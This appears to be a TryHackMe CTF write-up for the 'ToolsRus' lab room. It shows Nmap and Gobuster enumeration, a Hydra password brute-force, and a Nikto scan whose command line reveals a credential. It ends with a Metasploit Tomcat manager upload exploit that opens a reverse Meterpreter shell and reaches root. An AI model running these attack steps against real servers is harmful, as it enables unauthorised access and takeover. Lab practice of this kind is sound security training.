# ToolsRUS

This is my write-up for the room [ToolsRus] (https://tryhackme.com/room/toolsrus)

Your challenge is to use the tools listed below to enumerate a server, gathering information along the way that will eventually lead to you taking over the machine.

This task requires you to use the following tools:

Dirbuster
Hydra
Nmap
Nikto
Metasploit
## Difficulty
My Difficulty: Easy

Try Hackme Difficulty: Easy

<p align="center">
<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a7/Toys_%22R%22_Us_logo.svg/1280px-Toys_%22R%22_Us_logo.svg.png" style="width:25%;">
</p>

## Reconnaissance

Host = `10.10.244.140`

## Enumeration / Scanning

Let's start with an initial Nmap scan.

### Service / Port Enumeration
## NMAP

```console
Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-18 11:20 PDT
Nmap scan report for 10.10.123.159
Host is up (0.15s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7b:61:82:61:88:8e:99:80:2e:23:a5:d2:55:c0:60:e6 (RSA)
|   256 5d:56:ff:7f:3c:1e:7f:90:0b:b2:90:56:d0:f9:fa:e5 (ECDSA)
|_  256 a8:6b:b8:2b:f2:fa:0d:58:ff:8a:50:01:79:21:ca:75 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.72 seconds

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.72 seconds
```
Next lets run a dir buster (wasn't getting results, so I had to reset the box with its new IP being 10.10.244.140, again had to reset it. Not sure what the issue is, but it seems that if I attempt to do multiple things on the box i.e. attempt to access web interface while scanning it crashes. Hopfullying final IP: 10.10.110.225)

## Gobuster
```console
gobuster dir -u http://10.10.160.183 -w /home/noob2uub/Documents/Wordlists/2.3-small.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.160.183
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/noob2uub/Documents/Wordlists/2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/18 12:30:39 Starting gobuster in directory enumeration mode
===============================================================
/guidelines           (Status: 301) [Size: 319] [--> http://10.10.160.183/guidelines/]
/protected            (Status: 401) [Size: 460]    
```
Going to the main address we can see there is nothing here 

![Screenshot_2022-03-18_11-52-30](https://user-images.githubusercontent.com/68706090/159074679-a3d6a87b-89a7-472d-8dbd-a72e182eabbb.png)

So lets check out /guidlines now shows us this. 

![Screenshot_2022-03-18_11-41-18](https://user-images.githubusercontent.com/68706090/159074671-80528e5b-cec9-4466-957c-1398ad966695.png)

We have a user name and confirming TomCat server thats runing on port 1234

Now lets take a look at /protected

![Screenshot_2022-03-18_12-53-34](https://user-images.githubusercontent.com/68706090/159074851-fab2db32-1b12-4909-aba8-cf3692b97280.png)

looking at this we can see that we can use hydra using http-get 

### Hydra
```console
hydra -l bob -P /home/noob2uub/Documents/Wordlists/rockyou.txt -f 10.10.160.183 http-get /protected/
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-18 12:51:29
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.10.160.183:80/protected/
[80][http-get] host: 10.10.160.183   login: bob   password: ******
[STATUS] attack finished for 10.10.160.183 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-03-18 12:51:34
```
We have his password ******

Now lets log into the site 

![Screenshot_2022-03-18_13-01-37](https://user-images.githubusercontent.com/68706090/159075501-64641e34-8447-471b-ae99-a2af9e158f3d.png)

we can see that we need to try another port. Lets try 1234 or 8009
I couldn't find anything really on port 1234 or 8009 though the web interface and decided to take a step back and look at the tasks. It basically tells you do conduct a Nikto Scan

### Nikto

```console
 nikto -host 10.10.160.183 -port 1234 -id bob:bubbles
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.160.183
+ Target Hostname:    10.10.160.183
+ Target Port:        1234
+ Start Time:         2022-03-18 13:12:23 (GMT-7)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-39272: /favicon.ico file identifies this app/server as: Apache Tomcat (possibly 5.5.26 through 8.0.15), Alfresco Community
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ Successfully authenticated to realm 'Tomcat Manager Application' with user-supplied credentials.
+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
+ /host-manager/html: Tomcat Manager / Host Manager interface found (pass protected)
+ /manager/status: Tomcat Server Status interface found (pass protected)
+ 7892 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2022-03-18 13:35:54 (GMT-7) (1411 seconds)

```

While this scan is running we can answer more of the questions based on the NMAP scan and we know that its running Tomcat on port 1234 so lets just start running Metasploit while we wait to get the answer for the flag on Nikto, because this is taking a while. 

### Metasploit

I got tired of waiting for Nikto to give me the answer to I decided to use metasploit to search port 1234 while I was in it. 

```console
msf5 > use auxilary scanner
[-] No results from search
[-] Failed to load module: auxilary
msf5 > Interrupt: use the 'exit' command to quit
use auxiliary/scanner/http/dir_scannermsf5 > use auxiliary/scanner/http/dir_scanner
msf5 auxiliary(scanner/http/dir_scanner) > set RHOST 10.10.160.183
RHOST => 10.10.160.183
msf5 auxiliary(scanner/http/dir_scanner) > set RPORT 1234
RPORT => 1234
msf5 auxiliary(scanner/http/dir_scanner) > run

[*] Detecting error code
[*] Using code '404' as not found for 10.10.160.183
[+] Found http://10.10.160.183:1234/[SecCheck]/ 400 (10.10.160.183)
[+] Found http://10.10.160.183:1234/docs/ 200 (10.10.160.183)
[+] Found http://10.10.160.183:1234/examples/ 200 (10.10.160.183)
[+] Found http://10.10.160.183:1234/manager/ 302 (10.10.160.183)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
This is  where I found the /manager directory

![Screenshot_2022-03-18_13-34-15](https://user-images.githubusercontent.com/68706090/159079475-e42db75c-50ce-4c75-a692-d55be214ead1.png)

Scrolling through this, there are probably many ways to get but the box calls to use metasploit so lets dive in. 
```console
msf5 > search tomcat

Matching Modules
================

   #   Name                                                         Disclosure Date  Rank       Check  Description
   -   ----                                                         ---------------  ----       -----  -----------
   0   auxiliary/admin/http/ibm_drm_download                        2020-04-21       normal     Yes    IBM Data Risk Manager Arbitrary File Download
   1   auxiliary/admin/http/tomcat_administration                                    normal     No     Tomcat Administration Tool Default Access
   2   auxiliary/admin/http/tomcat_utf8_traversal                   2009-01-09       normal     No     Tomcat UTF-8 Directory Traversal Vulnerability
   3   auxiliary/admin/http/trendmicro_dlp_traversal                2009-01-09       normal     No     TrendMicro Data Loss Prevention 5.5 Directory Traversal
   4   auxiliary/dos/http/apache_commons_fileupload_dos             2014-02-06       normal     No     Apache Commons FileUpload and Apache Tomcat DoS
   5   auxiliary/dos/http/apache_tomcat_transfer_encoding           2010-07-09       normal     No     Apache Tomcat Transfer-Encoding Information Disclosure and DoS
   6   auxiliary/dos/http/hashcollision_dos                         2011-12-28       normal     No     Hashtable Collisions
   7   auxiliary/scanner/http/tomcat_enum                                            normal     No     Apache Tomcat User Enumeration
   8   auxiliary/scanner/http/tomcat_mgr_login                                       normal     No     Tomcat Application Manager Login Utility
   9   exploit/linux/http/cisco_prime_inf_rce                       2018-10-04       excellent  Yes    Cisco Prime Infrastructure Unauthenticated Remote Code Execution
   10  exploit/linux/http/cpi_tararchive_upload                     2019-05-15       excellent  Yes    Cisco Prime Infrastructure Health Monitor TarArchive Directory Traversal Vulnerability
   11  exploit/multi/http/cisco_dcnm_upload_2019                    2019-06-26       excellent  Yes    Cisco Data Center Network Manager Unauthenticated Remote Code Execution
   12  exploit/multi/http/struts2_namespace_ognl                    2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
   13  exploit/multi/http/struts_code_exec_classloader              2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   14  exploit/multi/http/struts_dev_mode                           2012-01-06       excellent  Yes    Apache Struts 2 Developer Mode OGNL Execution
   15  exploit/multi/http/tomcat_jsp_upload_bypass                  2017-10-03       excellent  Yes    Tomcat RCE via JSP Upload Bypass
   16  exploit/multi/http/tomcat_mgr_deploy                         2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   17  exploit/multi/http/tomcat_mgr_upload                         2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   18  exploit/multi/http/zenworks_configuration_management_upload  2015-04-07       excellent  Yes    Novell ZENworks Configuration Management Arbitrary File Upload
   19  exploit/windows/http/cayin_xpost_sql_rce                     2020-06-04       excellent  Yes    Cayin xPost wayfinder_seqid SQLi to RCE
   20  exploit/windows/http/tomcat_cgi_cmdlineargs                  2019-04-10       excellent  Yes    Apache Tomcat CGIServlet enableCmdLineArguments Vulnerability
   21  post/multi/gather/tomcat_gather                                               normal     No     Gather Tomcat Credentials
   22  post/windows/gather/enum_tomcat                                               normal     No     Windows Gather Apache Tomcat Enumeration
```

Looking at this number 15 stands out to me being a Tomcat RCE. so lets try that. After looking at this exploit it doesn't seem to work, yes I am posting my trial and error :) Ignor the next line, because it did not work, but I am posting my attempts.

```console
msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > set RHOST 10.10.160.183
RHOST => 10.10.160.183
msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > set RPORT 1234
RPORT => 1234
msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > show info

       Name: Tomcat RCE via JSP Upload Bypass
     Module: exploit/multi/http/tomcat_jsp_upload_bypass
   Platform: Linux, Windows
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2017-10-03

Provided by:
  peewpw

Available targets:
  Id  Name
  --  ----
  0   Automatic
  1   Java Windows
  2   Java Linux

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS     10.10.160.183    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT      1234             yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       The URI path of the Tomcat installation
  VHOST                       no        HTTP server virtual host

Payload information:

Description:
  This module uploads a jsp payload and executes it.

References:
  https://cvedetails.com/cve/CVE-2017-12617/
  http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12617
  https://bz.apache.org/bugzilla/show_bug.cgi?id=61542

msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > set TARGETURI /manager
TARGETURI => /manager
msf5 exploit(multi/http/tomcat_jsp_upload_bypass) > exploit

[*] Started reverse TCP handler on 192.168.1.116:4444 
[*] Uploading payload...
[-] Exploit aborted due to failure: unexpected-reply: Failed to upload the payload
[*] Exploit completed, but no session was created.
```
After looking at things more and we are in the manager part of Tomcat lets look at exploit/multi/http/tomcat_mgr_upload, we already have user credentials so I do not see a reason for *deploy. Fingers crossed. 

```console
exploit(multi/http/tomcat_mgr_upload) > show info

       Name: Apache Tomcat Manager Authenticated Upload Code Execution
     Module: exploit/multi/http/tomcat_mgr_upload
   Platform: Java, Linux, Windows
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2009-11-09

Provided by:
  rangercha

Available targets:
  Id  Name
  --  ----
  0   Java Universal
  1   Windows Universal
  2   Linux x86

Check supported:
  Yes

Basic options:
  Name          Current Setting  Required  Description
  ----          ---------------  --------  -----------
  HttpPassword  xxxxxx    x      no        The password for the specified username
  HttpUsername  bob              no        The username to authenticate as
  Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS        10.10.160.183    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT         1234             yes       The target port (TCP)
  SSL           false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
  VHOST                          no        HTTP server virtual host

Payload information:

Description:
  This module can be used to execute a payload on Apache Tomcat 
  servers that have an exposed "manager" application. The payload is 
  uploaded as a WAR archive containing a jsp application using a POST 
  request against the /manager/html/upload component. NOTE: The 
  compatible payload sets vary based on the selected target. For 
  example, you must select the Windows target to use native Windows 
  payloads.

References:
  https://cvedetails.com/cve/CVE-2009-3843/
  OSVDB (60317)
  https://cvedetails.com/cve/CVE-2009-4189/
  OSVDB (60670)
  https://cvedetails.com/cve/CVE-2009-4188/
  http://www.securityfocus.com/bid/38084
  https://cvedetails.com/cve/CVE-2010-0557/
  http://www-01.ibm.com/support/docview.wss?uid=swg21419179
  https://cvedetails.com/cve/CVE-2010-4094/
  http://www.zerodayinitiative.com/advisories/ZDI-10-214
  https://cvedetails.com/cve/CVE-2009-3548/
  OSVDB (60176)
  http://www.securityfocus.com/bid/36954
  http://tomcat.apache.org/tomcat-5.5-doc/manager-howto.html

msf5 exploit(multi/http/tomcat_mgr_upload) > exploit

[*] Started reverse TCP handler on 192.168.1.116:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying D3uNrlU9erGrQ1teryGVlSov...
[*] Executing D3uNrlU9erGrQ1teryGVlSov...
[*] Undeploying D3uNrlU9erGrQ1teryGVlSov ...
[*] Exploit completed, but no session was created.
msf5 exploit(multi/http/tomcat_mgr_upload) > set LHOST 10.13.27.142
LHOST => 10.13.27.142
msf5 exploit(multi/http/tomcat_mgr_upload) > set LPORT 4444
LPORT => 4444
msf5 exploit(multi/http/tomcat_mgr_upload) > exploit

[*] Started reverse TCP handler on 10.13.27.142:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying Xbwft7rbPFAvFT74...
[*] Executing Xbwft7rbPFAvFT74...
[*] Sending stage (53944 bytes) to 10.10.160.183
[*] Undeploying Xbwft7rbPFAvFT74 ...
[*] Meterpreter session 1 opened (10.13.27.142:4444 -> 10.10.160.183:57314) at 2022-03-18 13:54:10 -0700
```
So one mistake that you can see is I forgot the set the LHOST and LPORT to listen back on to....  So now lets go through it and see what we can find. 

```console
meterpreter > ls
Listing: /
==========

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
40776/rwxrwxrw-   4096      dir   2019-03-10 23:13:25 -0700  bin
40776/rwxrwxrw-   4096      dir   2019-03-10 23:13:35 -0700  boot
40776/rwxrwxrw-   3260      dir   2022-03-18 12:07:57 -0700  dev
40776/rwxrwxrw-   4096      dir   2022-03-18 12:08:10 -0700  etc
40776/rwxrwxrw-   4096      dir   2019-03-10 14:52:32 -0700  home
100666/rw-rw-rw-  12713476  fil   2019-03-10 23:13:35 -0700  initrd.img
40776/rwxrwxrw-   4096      dir   2019-02-12 09:47:22 -0800  lib
40776/rwxrwxrw-   4096      dir   2019-02-12 09:28:02 -0800  lib64
40776/rwxrwxrw-   16384     dir   2019-02-12 09:37:53 -0800  lost+found
40776/rwxrwxrw-   4096      dir   2019-02-12 09:27:12 -0800  media
40776/rwxrwxrw-   4096      dir   2019-02-12 09:27:12 -0800  mnt
40776/rwxrwxrw-   4096      dir   2019-02-12 09:27:12 -0800  opt
40776/rwxrwxrw-   0         dir   2022-03-18 12:07:51 -0700  proc
40776/rwxrwxrw-   4096      dir   2019-03-11 09:06:14 -0700  root
40776/rwxrwxrw-   860       dir   2022-03-18 12:08:26 -0700  run
40776/rwxrwxrw-   12288     dir   2019-03-10 23:13:26 -0700  sbin
40776/rwxrwxrw-   4096      dir   2019-03-10 14:52:41 -0700  snap
40776/rwxrwxrw-   4096      dir   2019-02-12 09:27:12 -0800  srv
40776/rwxrwxrw-   0         dir   2022-03-18 12:07:53 -0700  sys
40776/rwxrwxrw-   4096      dir   2022-03-18 13:53:50 -0700  tmp
40776/rwxrwxrw-   4096      dir   2019-02-12 09:27:12 -0800  usr
40776/rwxrwxrw-   4096      dir   2019-03-10 15:19:00 -0700  var
100666/rw-rw-rw-  7030080   fil   2019-01-17 09:53:59 -0800  vmlinuz

meterpreter > whomai
[-] Unknown command: whomai.
meterpreter > shell
Process 1 created.
Channel 1 created.
whoami
root
python -c 'import pty; pty.spawn("/bin/bash")'
root@ip-10-10-160-183:/# cd /root
cd /root
root@ip-10-10-160-183:~# ls
ls
flag.txt  snap
root@ip-10-10-160-183:~# cat flag.txt
cat flag.txt
flag******
root@ip-10-10-160-183:~# 
```
I don't use metasploit that often and instantly went for a whoami, then remembered it doesn't work. So I used the shell command to go into the boxes native shell and stabilized the shell with python. 

from there it was just navigating to the flag. 

Unfortunelty I am still missing one task and the answer was not in the Nikto scan, so lets continue looking and see about just scanning /manage/html from what we found on the first Nikto Scan, maybe I will go watch a TV show and come back, because this takes forever. 

.
.
.
.
AFTER BEATING MY HEAD, if realized i did not format the host properly in Nikto. I was not putting the HTTP in so it was not authenticating during the scan.... 

```console 


